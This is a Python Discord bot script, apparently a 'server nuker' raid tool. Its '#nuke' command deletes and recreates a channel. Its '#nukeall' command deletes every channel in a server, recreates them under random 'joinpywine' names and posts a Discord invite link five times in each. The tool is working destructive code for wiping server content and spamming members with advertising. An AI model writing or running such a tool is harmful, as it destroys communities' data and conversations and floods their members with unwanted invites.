import discord
from discord.ext import commands
import colorama
from colorama import Fore, Style
import random
colorama.init()

# Create an Intents object with the required intents
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.messages = True  # Enable the messages intent for message-related events

# Create a bot instance with a command prefix and the specified intents
bot = commands.Bot(command_prefix='#', intents=intents)

# Define the authorized user ID
AUTHORIZED_USER_ID = int(input("Enter Your User ID: "))  # Convert to integer

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')

@bot.command()
@commands.has_permissions(manage_channels=True)
async def nuke(ctx, channel_id: int):
    if ctx.author.id != AUTHORIZED_USER_ID:
        await ctx.send("You do not have permission to use this command. Now Just Watch :smiling_imp:")
        return
    # Get the channel by ID
    channel = bot.get_channel(channel_id)
    if channel is None:
        await ctx.send("Channel not found!")
        return

    # Create a new channel with the same name and category
    try:
        # Save the category and name
        category = channel.category
        channel_name = channel.name

        # Delete the old channel
        await channel.delete()

        # Create a new channel
        if category:
            new_channel = await category.create_text_channel(name=channel_name)
        else:
            new_channel = await ctx.guild.create_text_channel(name=channel_name)

        await ctx.send(f"Channel `{channel_name}` has been nuked and recreated!")

        # Send "hello :3" message in the newly created channel
        await new_channel.send("hello :3")

    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

@bot.command()
@commands.has_permissions(manage_channels=True)
async def nukeall(ctx):
    # Check if the user ID matches the authorized user ID
    if ctx.author.id != AUTHORIZED_USER_ID:
        await ctx.send("You do not have permission to use this command. Now Just Watch :smiling_imp:")
        return

    # Get all channels in the guild
    channels = ctx.guild.channels
    deleted_channels = []

    # Try to delete all channels
    for channel in channels:
        try:
            deleted_channels.append((channel.name, channel.category))
            await channel.delete()
        except Exception as e:
            await ctx.send(f"Failed to delete channel `{channel.name}`: {e}")

    # Recreate all channels and send "hello :3"
    for name, category in deleted_channels:
        try:
            if category:
                new_channel = await category.create_text_channel(name=f"joinpywine{random.uniform(0.3, 100000)}")
            else:
                new_channel = await ctx.guild.create_text_channel(name=f"joinpywine{random.uniform(0.3, 100000)}")
            
            # Send "hello :3" message in the newly created channel
            await new_channel.send("https://discord.gg/EKRmK4Fh4E")
            await new_channel.send("https://discord.gg/EKRmK4Fh4E")
            await new_channel.send("https://discord.gg/EKRmK4Fh4E")
            await new_channel.send("https://discord.gg/EKRmK4Fh4E")
            await new_channel.send("https://discord.gg/EKRmK4Fh4E")

        except Exception as e:
            await ctx.send(f"Failed to recreate channel `{name}`: {e}")

    await ctx.send("All channels have been nuked and recreated!")

TOKEN = input("Enter Your Token: ")

print(f"\n[{Fore.LIGHTGREEN_EX}+{Fore.WHITE}]{Fore.MAGENTA} N{Fore.WHITE}uke {Fore.MAGENTA}-{Fore.WHITE} {Fore.MAGENTA}N{Fore.WHITE}ukes {Fore.MAGENTA}C{Fore.WHITE}hannel")
print(f"\n[{Fore.LIGHTGREEN_EX}+{Fore.WHITE}]{Fore.MAGENTA} N{Fore.WHITE}uke{Fore.MAGENTA}a{Fore.WHITE}ll {Fore.MAGENTA}-{Fore.WHITE} {Fore.MAGENTA}N{Fore.WHITE}ukes {Fore.MAGENTA}C{Fore.WHITE}hannel\n")
# Run the bot with your token
bot.run(TOKEN)
